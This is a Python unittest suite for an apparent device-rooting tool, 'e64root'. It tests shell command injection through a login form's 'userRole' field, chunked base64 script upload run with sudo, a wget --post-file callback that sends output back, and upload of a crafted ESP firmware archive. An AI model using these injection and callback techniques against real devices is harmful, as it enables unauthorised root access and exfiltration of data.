from __future__ import annotations

import base64
import unittest

from helpers import FakeCallback, FakeClient

from e64root.errors import PreconditionError, TransportError, VerificationError
from e64root.payloads import esp_script, esp_zip
from e64root.transports import (
    EspTransport,
    WebTransport,
    _quote_injection,
    parse_kv,
    parse_callback_uid,
    validate_esp_preconditions,
)


def injected_command(fields: dict[str, str]) -> str:
    value = fields["userRole"]
    assert value.startswith("x';") and value.endswith(";#")
    return value[3:-2]


class InjectionQuoteTests(unittest.TestCase):
    def test_exact_shape(self):
        self.assertEqual(_quote_injection("id"), "x';id;#")

    def test_rejects_nul(self):
        with self.assertRaises(TransportError):
            _quote_injection("id\x00")


class WebTransportTests(unittest.TestCase):
    def setUp(self):
        self.client = FakeClient()
        self.transport = WebTransport(self.client, chunk_size=512)

    def test_inject_sends_login_fields(self):
        result = self.transport.inject("id")
        self.assertEqual(result.status, 200)
        path, fields = self.client.posts[-1]
        self.assertEqual(path, "/login.php")
        self.assertEqual(fields["login"], "1")
        self.assertEqual(fields["requestDeveloper"], "1")
        self.assertEqual(injected_command(fields), "id")

    def test_run_script_chunks_and_reassembles(self):
        script = "x" * 2500
        requests = self.transport.run_script(script)
        self.assertEqual(requests, 2 + (len(base64.b64encode(script.encode())) + 511) // 512)
        chunks = []
        for _, fields in self.client.posts[1:-1]:
            command = injected_command(fields)
            self.assertTrue(command.startswith("printf '%s' '"))
            chunks.append(command[len("printf '%s' '"):-len("' >> /tmp/e64root-web.b64")])
        self.assertEqual(base64.b64decode("".join(chunks)).decode(), script)
        final = injected_command(self.client.posts[-1][1])
        self.assertIn("base64 -d /tmp/e64root-web.b64", final)
        self.assertIn("sudo sh /tmp/e64root-web.sh", final)

    def test_run_capture_uses_callback(self):
        callback = FakeCallback(body=b"uid=0\n")
        output = self.transport.run_capture("#!/bin/sh\nid\n", callback, timeout=0.1)
        self.assertEqual(output, "uid=0\n")
        chunks = []
        for _, fields in self.client.posts[1:-1]:
            command = injected_command(fields)
            if command.startswith("printf '%s' '"):
                chunks.append(command[len("printf '%s' '"):-len("' >> /tmp/e64root-web.b64")])
        decoded = base64.b64decode("".join(chunks)).decode()
        self.assertIn("wget", decoded)
        self.assertIn("--post-file /tmp/e64root-last.out", decoded)
        self.assertIn(callback.url, decoded)


class EspTransportTests(unittest.TestCase):
    def test_upload_success(self):
        client = FakeClient()
        transport = EspTransport(client)
        payload = esp_zip(esp_script("id", "http://127.0.0.1:9/e64root/test-token"))
        reply = transport.upload(payload)
        self.assertIn("Upload successful!", reply)
        self.assertEqual(client.posts[-1][0], "/upload_esp.php")

    def test_upload_rejected(self):
        client = FakeClient()
        client.upload_body = '<font color="red">Update failed!</font>'
        with self.assertRaises(TransportError):
            EspTransport(client).upload(esp_zip(esp_script("id", "http://127.0.0.1:9/e64root/test-token")))

    def test_upload_http_error(self):
        client = FakeClient()
        client.upload_status = 500
        with self.assertRaises(TransportError):
            EspTransport(client).upload(esp_zip(esp_script("id", "http://127.0.0.1:9/e64root/test-token")))

    def test_rejects_empty_archive(self):
        with self.assertRaises(TransportError):
            EspTransport(FakeClient()).upload(b"")


class ParsingTests(unittest.TestCase):
    def test_parse_kv(self):
        values = parse_kv("uid=0\nlog=x=y\nignored\n\nname=value\n")
        self.assertEqual(values["uid"], "0")
        self.assertEqual(values["log"], "x=y")
        self.assertEqual(values["name"], "value")

    def test_parse_callback_uid(self):
        self.assertEqual(
            parse_callback_uid(b"hello\nuid=0(root) gid=0(root)\n"),
            "uid=0(root) gid=0(root)",
        )

    def test_parse_callback_uid_uses_last_line(self):
        self.assertEqual(
            parse_callback_uid(b"uid=1000(user)\nuid=0(root)\n"), "uid=0(root)"
        )

    def test_parse_callback_uid_missing(self):
        with self.assertRaises(VerificationError):
            parse_callback_uid(b"hello\n")

    def test_preconditions_good(self):
        validate_esp_preconditions(
            {
                "uid": "0",
                "log_www_writable": "yes",
                "tty_stm5": "yes",
                "flash_script": "yes",
                "set_bootmode": "yes",
                "unset_bootmode": "yes",
            }
        )

    def test_preconditions_bad_log(self):
        with self.assertRaises(PreconditionError):
            validate_esp_preconditions(
                {
                    "uid": "0",
                    "log_www_writable": "no",
                    "tty_stm5": "yes",
                    "flash_script": "yes",
                    "set_bootmode": "yes",
                    "unset_bootmode": "yes",
                }
            )

    def test_preconditions_missing_tty(self):
        with self.assertRaises(PreconditionError):
            validate_esp_preconditions(
                {
                    "uid": "0",
                    "log_www_writable": "yes",
                    "tty_stm5": "no",
                    "flash_script": "yes",
                    "set_bootmode": "yes",
                    "unset_bootmode": "yes",
                }
            )

    def test_preconditions_wrong_uid(self):
        with self.assertRaises(PreconditionError):
            validate_esp_preconditions({"uid": "33"})


if __name__ == "__main__":
    unittest.main()
